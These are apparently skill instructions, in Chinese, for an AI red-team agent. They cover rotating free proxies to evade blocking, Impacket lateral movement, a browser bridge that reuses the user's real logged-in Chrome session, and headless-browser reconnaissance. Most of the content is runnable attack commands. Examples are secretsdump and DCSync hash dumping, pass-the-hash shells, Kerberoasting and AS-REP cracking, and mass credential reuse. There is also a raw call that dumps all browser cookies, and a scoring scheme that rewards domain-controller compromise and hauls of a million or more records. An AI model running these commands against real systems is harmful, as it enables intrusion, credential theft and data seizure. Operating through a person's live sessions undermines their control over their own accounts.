    "text": "# 国内免费 IP 代理池\n\n免费代理不稳定，定位是**降低被封风险**而不是隐藏身份。关键目标优先用自有出口或 suo5 隧道。\n\n## ⛔ 铁规则：不许动本机的网络与代理配置\n\n使用代理**只允许在单条命令上临时指定**，任何情况下都不要修改本机配置。以下操作一律禁止：\n\n| 禁止 | 说明 |\n|---|---|\n| 设系统代理 | GNOME/KDE 网络设置、`gsettings set org.gnome.system.proxy …`、`networksetup -setwebproxy`、Windows `netsh winhttp set proxy` |\n| 写全局环境变量 | 修改 `/etc/environment`、`/etc/profile`、`/etc/profile.d/*`、`~/.bashrc`、`~/.bash_profile`、`~/.profile`、`~/.zshrc` 里的 `http_proxy` / `https_proxy` / `all_proxy` / `no_proxy` |\n| 改工具全局配置 | `~/.curlrc`、`~/.wgetrc`、`~/.npmrc`、`/etc/apt/apt.conf.d/*proxy*`、`/etc/pip.conf`、`~/.docker/config.json`、`~/.gitconfig` 的 proxy 项 |\n| 改 proxychains 全局配置 | 不修改 `/etc/proxychains4.conf`、`~/.proxychains/proxychains.conf`；确需用时用 `-f` 指向 `runs/` 下的临时配置，用完删除 |\n| 动系统网络 | iptables/nftables 规则、路由表、DNS（`/etc/resolv.conf`）、NetworkManager、起停 VPN/tun 设备 |\n| 持久化 export | 不在 shell 里 `export http_proxy=…` 让它留在会话里；要传就**内联**在该条命令前 |\n\n**正确姿势**（全部是命令级、一次性的）：\n\n```bash\nP=$(shuf -n1 runs/live-proxies.txt)\n\n# 方式一：工具自带的代理参数（首选）\ncurl -s --proxy \"http://$P\" --max-time 15 -I \"https://target.example.com/\"\nnuclei -u https://target.example.com/ -proxy \"http://$P\" -rate-limit 20\nsqlmap -u \"https://target.example.com/item?id=1\" --proxy=\"http://$P\" --batch --random-agent\nffuf -u https://target.example.com/api/FUZZ -w wordlist.txt -x \"http://$P\" -rate 20\n\n# 方式二：只对这条命令内联环境变量（不 export，进程结束即失效）\nhttp_proxy=\"http://$P\" https_proxy=\"http://$P\" curl -s --max-time 15 \"https://target.example.com/\"\n\n# 方式三：只支持原始 TCP 的工具 → 用 suo5 SOCKS5 隧道（技能 suo5-tunnel），\n#        不要为它去改系统代理；proxychains 用临时配置文件：\nproxychains4 -f runs/proxychains.tmp.conf -q nmap -sT -Pn -p 80,443 10.0.0.5\n```\n\n## 一、抓取（多源合并）\n```bash\nmkdir -p runs && cd runs\ncurl -s --max-time 20 \"https://www.89ip.cn/tqdl.html?api=1&num=50&port=&address=%E4%B8%AD%E5%9B%BD&isp=\" \\\n  | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}:[0-9]{2,5}' >> raw-proxies.txt\ncurl -s --max-time 20 \"http://www.ip3366.net/free/?stype=1\" \\\n  | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}</td>[[:space:]]*<td>[0-9]{2,5}' \\\n  | sed -E 's#</td>[[:space:]]*<td>#:#' >> raw-proxies.txt\ncurl -s --max-time 20 \"https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/countries/CN/data.txt\" \\\n  | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}:[0-9]{2,5}' >> raw-proxies.txt\nsort -u raw-proxies.txt -o raw-proxies.txt && wc -l raw-proxies.txt\n```\n\n## 二、验证（并发测活，留下能用的）\n```bash\ncat > runs/check_proxy.py <<'PY'\nimport concurrent.futures, sys, urllib.request\nTARGET = \"http://www.baidu.com\"   # 仅测连通性，不携带任何敏感数据\ndef ok(proxy):\n    try:\n        op = urllib.request.build_opener(urllib.request.ProxyHandler({\"http\": \"http://\" + proxy, \"https\": \"http://\" + proxy}))\n        with op.open(TARGET, timeout=6) as r:\n            return proxy if r.status == 200 else None\n    except Exception:\n        return None\nwith open(sys.argv[1]) as f:\n    cands = [l.strip() for l in f if l.strip()]\nwith concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:\n    for res in ex.map(ok, cands):\n        if res: print(res, flush=True)\nPY\npython3 runs/check_proxy.py runs/raw-proxies.txt > runs/live-proxies.txt\nwc -l runs/live-proxies.txt\n```\n\n## 三、轮换与限速\n- 每个请求随机取一个代理；失败自动剔除并换下一个。\n- 目标侧仍要限速（`-rate-limit` / `--delay`），代理只是换出口 IP，不是加速器。\n- 记录每个出口 IP 的成败，同一目标连续 3 次被封就按漏洞检测提示词里的规则**放弃该目标**。\n\n## 四、注意事项\n- **不要通过免费代理传输凭据、Cookie、上传的 shell**——免费代理可能记录流量。\n- 测活只测连通性，不要用真实业务请求去测。\n- 高频爆破前确认目标没有账号锁定策略；触发锁定前主动停手。\n- 用完清掉 `runs/` 下的临时配置（如 `proxychains.tmp.conf`），不要在系统里留下任何代理痕迹。\n- 仅在授权演练范围内使用。"

    "text": "# 内网横向与提权（Impacket 套件）\n\n拿到一台机器和内网可达性之后，**横向到更多主机**（`server-host`）和**找到域控/核心系统**（`central-system`）\n是内网阶段的主线。本机已装 **61 个 `impacket-*` 命令**（Kali 自带），是本阶段的主力工具集。\n\n## 本机工具\n\n| 工具 | 路径 | 用途 |\n| --- | --- | --- |\n| Impacket 套件 | `/usr/bin/impacket-*`（61 个命令） | 协议级横向、凭据转储、Kerberos 攻击 |\n| enum4linux | `/usr/bin/enum4linux` | SMB/域信息枚举（用户、共享、策略） |\n| smbclient | `/usr/bin/smbclient` | 共享浏览与读写 |\n| nbtscan | `/usr/bin/nbtscan` | NetBIOS 名称扫描 |\n| proxychains4 | `/usr/bin/proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |\n\n## 零、先做的事（信息决定打法）\n\n```bash\n# 1) 看我有什么（凭据/哈希/域信息）\n#    redteam_credential_list / redteam_access_list / redteam_asset_query\n# 2) 枚举域环境（有域账号后）\nimpacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all\nimpacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>\nenum4linux -a <target>               # 无凭据也能枚举出用户/共享/策略\n\n# 3) 共享与文件\nsmbclient -L //<target> -N                                  # 空会话列共享\nsmbclient //<target>/<share> -U <user>%<pass>                # 读共享\nimpacket-smbclient <domain>/<user>:<pass>@<target>           # 交互式，可 cd/ls/get/put\n```\n\n**内网扫描仍用 gogo/fscan**（技能 `gogo-intranet` / `fscan-intranet`）——本技能负责\"进去之后怎么走\"。\n\n## 一、凭据转储（拿到一台机器后的第一优先）\n\n```bash\n# 1) 远程 dump SAM/LSA/SECRETS（需管理员凭据）\nimpacket-secretsdump <domain>/<user>:<pass>@<target>\nimpacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # 用哈希直接 dump\n\n# 2) 只 dump 本地 SAM\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\n\n# 3) DCSync（有域管/复制权限时，直接拿域内所有哈希）—— 直通域控的关键一步\nimpacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc\n\n# 4) 抓明文/票据：配合目标侧工具（如 mimikatz）或 lsassy\n#    哈希拿到后用 credential-attack 离线破解，或直接 PtH（见下）\n```\n\n**输出处理**：dump 出的 `NTLM` 哈希逐条 `redteam_credential_add`（`source=凭据转储`，\n明文的口令写 `secret_value`，哈希写 `note` 或 `secret_value` 并标注类型），文件存 `runs/`。\n\n## 二、Pass-the-Hash（PtH，不用破解直接横向）\n\n```bash\n# 命令执行\nimpacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # 交互式 SYSTEM shell（噪声大）\nimpacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # 半交互，噪声较小（推荐）\nimpacket-atexec  -hashes :<NThash> <domain>/<user>@<target> \"whoami\" # 单命令，最安静\nimpacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # 通过服务执行\n\n# 拿文件\nimpacket-smbclient -hashes :<NThash> <domain>/<user>@<target>\n\n# 数据库\nimpacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>\n```\n\n**psexec 会落地服务、噪声大、可能被杀软拦**；优先 `wmiexec`/`atexec`。\n\n## 三、Kerberos 攻击（有域环境时）\n\n```bash\n# 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）\nimpacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt\nhashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 离线破解\n\n# 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）\nimpacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt\nhashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt\n\n# 3) 票据申请与使用\nimpacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache\nexport KRB5CCNAME=/path/to/user.ccache\nimpacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 用票据横向\n\n# 4) 委派攻击（域内提权路径）\nimpacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>\nimpacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>\n```\n\n## 四、凭据复用（比攻击快得多，永远先试）\n\n拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：\n1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；\n2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；\n3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；\n4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。\n\n## 五、隧道配合（内网目标不可直连时）\n\n```bash\n# 所有命令加 proxychains4，用临时配置（不要改系统配置）\ncat > runs/proxychains-1080.conf <<'EOF'\nstrict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.1 1080\nEOF\n\nproxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5\nproxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6\n# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射\n```\n\n## 六、纪律与边界\n\n1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），\n   不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。\n2. **噪声控制**：`psexec` 落地服务、`secretsdump` 触碰 LSASS，都会被 EDR 盯上；\n   优先 `wmiexec`/`atexec`，控制频率，别对整段做暴力横向。\n3. **不要把自己打锁**：域账号连续失败会锁定策略；先用现成凭据复用，弱口令爆破按技能 `credential-attack` 的限流纪律。\n4. **破坏性操作禁止**：不要停服务、不要改系统配置、不要删日志（除非演练明确要求且用户同意）。\n5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），\n   访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。\n\n## 七、输出与落库（强制）\n\n1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写\n   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\\system`）。\n2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；\n   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。\n3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），\n   `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。\n4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。\n5. 每个关键动作 `redteam_chain_add`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），\n   **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），\n   `result` 写回显摘要——报告要能照着复现。\n6. **回填知识库**：验证有效的通用利用脚本 `redteam_poc_add`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。"

    "builtin": true,
    "text": "# Kimi WebBridge（浏览器扩展 + 本地守护进程）\n\n已安装并运行：守护进程 **v2.0.8**（systemd 服务 `kimi-webbridge`，开机自启），监听 `127.0.0.1:10086`，二进制 `~/.kimi-webbridge/bin/kimi-webbridge`。\n\n## 当前状态（2026-09 实测）\n- 守护进程：**由 systemd 管理**（`/etc/systemd/system/kimi-webbridge.service`，`enabled` + `active`，`Restart=on-failure`）。\n  查状态：`systemctl status kimi-webbridge`；重启用 `sudo systemctl restart kimi-webbridge`。\n  **不要再手动跑 `kimi-webbridge start`/`upgrade`**，那会起一个游离进程、systemd 反而变 inactive；要升级用\n  `sudo systemctl stop kimi-webbridge && ~/.kimi-webbridge/bin/kimi-webbridge upgrade && sudo systemctl start kimi-webbridge`。\n- 扩展：**Kimi WebBridge v2.0.8，由企业策略自动从 Chrome 应用商店安装**（扩展 ID `fldmhceldgbpfpkbgopacenieobmligc`）。\n  策略文件 `/etc/opt/chrome/policies/managed/kimi-webbridge.json` 与 `/etc/chromium/policies/managed/kimi-webbridge.json`\n  都设置了 `ExtensionSettings.force_installed` + `ExtensionInstallForcelist`，所以 **Chrome / Chromium 的任何 profile 打开即自带扩展、自动更新、常驻启用**。\n- Chrome 137+ 已忽略 `--load-extension`（`--disable-features=…` 的逃生口也失效），所以**不要再走解压加载路线**。\n- 若 `status` 显示 `extension_connected: false`：99% 只是**没有浏览器在运行**，启动任一浏览器（`kimi-chrome` 或直接点 Chrome/Chromium 图标）后 5 秒内会自动连上。\n- 简单取页面内容可优先用技能 `browser-automation`（更快、不依赖浏览器窗口）；**需要复用真实登录态时必须用本技能**\n\n## 先决条件\n1. 守护进程已运行：`~/.kimi-webbridge/bin/kimi-webbridge status` 应显示 `\"running\": true`（开机自启，正常无需干预）。\n2. **必须有一个浏览器在运行**（扩展只在浏览器进程存活时维持连接）。启动器 `~/.local/bin/kimi-chrome`：\n   - 默认启动 Chrome **默认 profile**（带真实登录态，桥接的价值就在这）；\n   - `KIMI_BROWSER=chromium kimi-chrome` 改用 Chromium；`KIMI_PROFILE=/path kimi-chrome` 指定独立 profile（无登录态）。\n3. 检查连接：\n```bash\ncurl -s http://127.0.0.1:10086/status | python3 -m json.tool\n# 必须看到 \"extension_connected\": true，否则后续命令会失败\n```\n\n## 调用方式\n```bash\nWB=http://127.0.0.1:10086/command\ncall() { printf '%s' \"$2\" > /tmp/wb.json; curl -s -X POST $WB -H 'Content-Type: application/json' --data-binary @/tmp/wb.json; }\n```\n> 含中文的 JSON 一律走临时文件 + `--data-binary`，不要用 echo/heredoc 内联。\n\n### 常用动作\n```bash\n# 打开页面（新标签）\ncall navigate '{\"action\":\"navigate\",\"args\":{\"url\":\"https://target.example.com/login\",\"newTab\":true,\"group_title\":\"recon\"},\"session\":\"recon1\"}'\n\n# 读取页面纯文本（最常用）\ncall evaluate '{\"action\":\"evaluate\",\"args\":{\"code\":\"(() => document.body.innerText.slice(0,6000))()\"},\"session\":\"recon1\"}'\n\n# 取无障碍树（带 @e 元素引用，便于后续 click/fill）\ncall snapshot '{\"action\":\"snapshot\",\"args\":{},\"session\":\"recon1\"}'\n\n# 执行任意 JS：抓前端接口清单（信息收集/接口发现神器）\ncall evaluate '{\"action\":\"evaluate\",\"args\":{\"code\":\"(() => {const s=new Set();for(const e of performance.getEntriesByType(\\\"resource\\\"))s.add(e.name);const m=document.documentElement.innerHTML.match(/[\\\\\\\"\\\\x27]\\\\/(api|v[0-9])\\\\/[a-zA-Z0-9_\\\\-\\\\/{}]+/g)||[];m.forEach(x=>s.add(x));return [...s].slice(0,200).join(\\\"\\\\n\\\")})()\"},\"session\":\"recon1\"}'\n\n# 点击 / 填表\ncall click '{\"action\":\"click\",\"args\":{\"ref\":\"@e12\"},\"session\":\"recon1\"}'\ncall fill  '{\"action\":\"fill\",\"args\":{\"ref\":\"@e15\",\"value\":\"admin\"},\"session\":\"recon1\"}'\n\n# 截图（返回文件路径，不是 base64）\ncall screenshot '{\"action\":\"screenshot\",\"args\":{\"path\":\"$DSH_HOME/redteam/engagements/<靶标>/runs/shot.png\"},\"session\":\"recon1\"}'\n\n# 抓网络请求（找接口）\ncall network '{\"action\":\"network\",\"args\":{},\"session\":\"recon1\"}'\n\n# 列出/关闭标签\ncall list_tabs '{\"action\":\"list_tabs\",\"args\":{},\"session\":\"recon1\"}'\ncall close_session '{\"action\":\"close_session\",\"args\":{},\"session\":\"recon1\"}'\n```\n原始 CDP 透传（高级）：`{\"action\":\"cdp\",\"args\":{\"method\":\"Network.getAllCookies\"}}`。\n\n## 在红队流程里的用法\n- **接口发现**：打开站点 → `evaluate` 抓 resource timing + 页面内 JS 里的接口路径 → 把接口清单交给漏洞检测角色做越权/未授权测试。\n- **登录态页面**：用户在浏览器里已登录的后台，可直接 `navigate` + `evaluate` 读取内容，无需重新登录。\n- **JS 渲染站点**：比 curl 更真实，能拿到 SPA 渲染后的 DOM。\n- 发现的 URL/标题照常写回 `redteam_asset_add`（`tool=\"kimi-webbridge\"`）。\n\n## 限制（务必知道）\n- **无 headless**：必须有图形会话（本机 `DISPLAY=:10.0` 可用）。\n- 只支持 Chrome/Edge；跨域 iframe 不支持；`click`/`fill` 是合成事件，验证码/银行控件无效。\n- 扩展与守护进程版本强耦合：`status` 里 `update_available` 不为空就按上面的 systemd 停机 → `upgrade` → 启机流程升级守护进程；扩展由策略自动更新到最新版。\n- Linux 不在官方支持矩阵（能用但不保证）。\n\n## 无扩展时的兜底\n见技能 `browser-automation`（headless chromium 零依赖方案）。"

    "text": "# 浏览器自动化（headless Chrome）\n\n本机：`/usr/bin/chromium` 150.0.7871.181，`DISPLAY=:10.0`，Node v22.23.2。\n\n## 一、零依赖：chromium 命令行（最稳）\n```bash\nCHROME=/usr/bin/chromium\nFLAGS=\"--headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage --virtual-time-budget=8000\"\n\n# 1) 抓渲染后的 DOM（SPA 也能拿到内容）\n$CHROME $FLAGS --dump-dom \"https://target.example.com/\" 2>/dev/null > runs/page.html\n\n# 2) 只取纯文本\n$CHROME $FLAGS --dump-dom \"https://target.example.com/\" 2>/dev/null \\\n  | python3 -c \"import sys,re;h=sys.stdin.read();print(re.sub(r'<[^>]+>',' ',re.sub(r'(?is)<(script|style).*?</\\1>',' ',h)))\" | head -200\n\n# 3) 截图留证\n$CHROME $FLAGS --window-size=1440,900 --screenshot=runs/shot-$(date +%s).png \"https://target.example.com/\"\n\n# 4) 带 Cookie 访问（登录态复用：从 Burp/浏览器导出 Cookie 后写入）\n$CHROME $FLAGS --user-data-dir=/tmp/rt-profile --dump-dom \"https://target.example.com/admin\"\n\n# 5) 生成 PDF\n$CHROME $FLAGS --print-to-pdf=runs/page.pdf \"https://target.example.com/\"\n```\n\n### 抓前端接口清单（信息收集重点）\n```bash\n# 用 chromium 跑一段 JS 并输出结果\n$CHROME $FLAGS --dump-dom \"https://target.example.com/\" 2>/dev/null > runs/page.html\npython3 - <<'PY'\nimport re, json, pathlib\nhtml = pathlib.Path('runs/page.html').read_text(errors='ignore')\npaths = set(re.findall(r'[\"\\'](/(?:api|rest|v[0-9]|admin|user|order|upload|file)[A-Za-z0-9_\\-/{}.:]{0,80})[\"\\']', html))\nprint('\\n'.join(sorted(paths)))\nPY\n# 再结合 JS 资源逐个下载提取：\ngrep -oE 'src=\"[^\"]+\\.js[^\"]*\"' runs/page.html | sed 's/src=\"//;s/\"$//' | while read u; do\n  case \"$u\" in http*) url=\"$u\";; /*) url=\"https://target.example.com$u\";; *) url=\"https://target.example.com/$u\";; esac\n  curl -s \"$url\" | grep -oE '[\"\\'](/(api|rest|v[0-9])[A-Za-z0-9_\\-/{}.:]{0,80})[\"\\']' | tr -d '\"'\"'\" >> runs/interfaces.txt\ndone\nsort -u runs/interfaces.txt\n```\n\n## 二、playwright-cli（需要交互/等待/多页时）\n**本机已装好浏览器**（`~/.cache/ms-playwright/chromium-1243`，一次性 `npx playwright install chromium` 已完成）。注意：**默认走 chrome 通道会报 `Chromium distribution 'chrome' is not found`，必须加 `--browser chromium`**。\n\n```bash\nPW=\"npx --yes @playwright/cli@latest\"\n$PW -s=recon1 open --browser chromium \"https://target.example.com/\"   # 打开（-s 指定会话名）\n$PW -s=recon1 snapshot                                                # 无障碍树 + @e 元素引用\n$PW -s=recon1 eval \"() => document.title\"                             # 执行 JS\n$PW -s=recon1 find \"登录\"                                              # 在快照里搜文本\n$PW -s=recon1 click \"@e5\"                                             # 点击\n$PW -s=recon1 fill \"@e7\" \"admin\"                                      # 填表\n$PW -s=recon1 screenshot --path runs/pw.png                           # 截图\n$PW -s=recon1 --persistent --profile runs/pw-profile open --browser chromium URL   # 复用登录态\n$PW -s=recon1 close                                                   # 关闭会话\n```\n\n登录态复用：`--persistent --profile <dir>`；首次登录后该 profile 保留 Cookie，后续直接用同一 profile 打开即为已登录。\n常用子命令：`open / goto / snapshot / find / eval / click / fill / press / upload / screenshot / resize / reload / go-back / close / list`。\n\n## 三、选择建议\n| 场景 | 用哪个 |\n|---|---|\n| 只需页面内容/截图/接口清单 | chromium 命令行（零依赖、最快） |\n| 需要点击/填表/等待/多标签 | playwright-cli（`--browser chromium`）|\n| 需要复用用户真实登录态 | Kimi WebBridge（技能 `kimi-webbridge`，需扩展） |\n\n## 注意事项\n- `--no-sandbox` 仅在本机演练环境使用；不要把该参数带进生产。\n- 抓到的 URL/标题写回 `redteam_asset_add`（`url`/`title` 字段），接口清单写 `runs/` 并在攻击链里引用。\n- 截图与页面内容可能含敏感数据，只落 `runs/`，不要写进资产库。"
